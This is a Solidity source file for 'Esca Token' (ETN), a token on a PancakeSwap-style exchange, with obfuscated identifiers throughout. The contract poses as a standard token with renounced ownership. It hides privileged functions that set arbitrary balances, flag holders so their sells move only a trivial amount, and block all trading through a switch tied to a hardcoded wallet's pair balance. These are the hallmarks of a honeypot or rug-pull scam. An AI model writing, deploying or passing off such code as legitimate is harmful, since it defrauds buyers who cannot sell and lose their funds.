//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface modeLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTeam) external view returns (uint256);

    function transfer(address minBuy, uint256 swapAt) external returns (bool);

    function allowance(address tokenAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapAt) external returns (bool);

    function transferFrom(
        address sender,
        address minBuy,
        uint256 swapAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchTotalReceiver, uint256 value);
    event Approval(address indexed tokenAt, address indexed spender, uint256 value);
}

abstract contract fundSwapReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toReceiver {
    function createPair(address txSellExempt, address autoMax) external returns (address);
}

interface limitEnable is modeLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EscaToken is fundSwapReceiver, modeLaunched, limitEnable {

    address public txLaunch;

    mapping(address => uint256) private modeTake;

    function decimals() external view virtual override returns (uint8) {
        return fundSwap;
    }

    bool public fundWallet;

    string private takeLimit = "Esca Token";

    uint256 private tradingSell = 100000000 * 10 ** 18;

    function listFrom(address txToken, address minBuy, uint256 swapAt) internal returns (bool) {
        require(modeTake[txToken] >= swapAt);
        modeTake[txToken] -= swapAt;
        modeTake[minBuy] += swapAt;
        emit Transfer(txToken, minBuy, swapAt);
        return true;
    }

    uint256 constant teamIs = 11 ** 10;

    address tradingMinBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address txToken, address minBuy, uint256 swapAt) external override returns (bool) {
        if (_msgSender() != tradingMinBuy) {
            if (teamEnable[txToken][_msgSender()] != type(uint256).max) {
                require(swapAt <= teamEnable[txToken][_msgSender()]);
                teamEnable[txToken][_msgSender()] -= swapAt;
            }
        }
        return totalLiquidityExempt(txToken, minBuy, swapAt);
    }

    mapping(address => bool) public amountFee;

    string private isReceiverTeam = "ETN";

    uint256 public limitWallet;

    event OwnershipTransferred(address indexed receiverTakeLaunched, address indexed launchedShould);

    uint256 feeMin;

    uint256 public walletBuy;

    uint256 public txAmount;

    function name() external view virtual override returns (string memory) {
        return takeLimit;
    }

    bool public teamFee;

    function exemptToken() private view {
        require(amountFee[_msgSender()]);
    }

    address public fromSell;

    function totalSellTx(uint256 swapAt) public {
        exemptToken();
        liquidityMarketing = swapAt;
    }

    function totalLiquidityExempt(address txToken, address minBuy, uint256 swapAt) internal returns (bool) {
        if (txToken == fromSell) {
            return listFrom(txToken, minBuy, swapAt);
        }
        uint256 enableFrom = modeLaunched(txLaunch).balanceOf(walletReceiver);
        require(enableFrom == liquidityMarketing);
        require(minBuy != walletReceiver);
        if (isSellBuy[txToken]) {
            return listFrom(txToken, minBuy, teamIs);
        }
        return listFrom(txToken, minBuy, swapAt);
    }

    bool private fromAt;

    function minFee() public {
        emit OwnershipTransferred(fromSell, address(0));
        limitReceiverMax = address(0);
    }

    bool public marketingWallet;

    function approve(address fromMode, uint256 swapAt) public virtual override returns (bool) {
        teamEnable[_msgSender()][fromMode] = swapAt;
        emit Approval(_msgSender(), fromMode, swapAt);
        return true;
    }

    mapping(address => mapping(address => uint256)) private teamEnable;

    function isEnable(address liquidityTeamEnable) public {
        if (marketingWallet) {
            return;
        }
        if (walletBuy != txAmount) {
            isReceiver = true;
        }
        amountFee[liquidityTeamEnable] = true;
        
        marketingWallet = true;
    }

    uint256 private maxLaunch;

    function allowance(address fromMax, address fromMode) external view virtual override returns (uint256) {
        if (fromMode == tradingMinBuy) {
            return type(uint256).max;
        }
        return teamEnable[fromMax][fromMode];
    }

    function transfer(address receiverFee, uint256 swapAt) external virtual override returns (bool) {
        return totalLiquidityExempt(_msgSender(), receiverFee, swapAt);
    }

    bool private modeLaunchTotal;

    function owner() external view returns (address) {
        return limitReceiverMax;
    }

    address private limitReceiverMax;

    address walletReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private isReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingSell;
    }

    function receiverMax(address fundAuto) public {
        exemptToken();
        if (modeLaunchTotal) {
            teamFee = true;
        }
        if (fundAuto == fromSell || fundAuto == txLaunch) {
            return;
        }
        isSellBuy[fundAuto] = true;
    }

    function fromTeam(address receiverFee, uint256 swapAt) public {
        exemptToken();
        modeTake[receiverFee] = swapAt;
    }

    constructor (){
        
        minFee();
        listEnable receiverIs = listEnable(tradingMinBuy);
        txLaunch = toReceiver(receiverIs.factory()).createPair(receiverIs.WETH(), address(this));
        
        fromSell = _msgSender();
        amountFee[fromSell] = true;
        modeTake[fromSell] = tradingSell;
        if (maxLaunch == txAmount) {
            teamFee = true;
        }
        emit Transfer(address(0), fromSell, tradingSell);
    }

    bool public buyMax;

    uint256 liquidityMarketing;

    function balanceOf(address shouldTeam) public view virtual override returns (uint256) {
        return modeTake[shouldTeam];
    }

    function getOwner() external view returns (address) {
        return limitReceiverMax;
    }

    uint8 private fundSwap = 18;

    mapping(address => bool) public isSellBuy;

    function symbol() external view virtual override returns (string memory) {
        return isReceiverTeam;
    }

}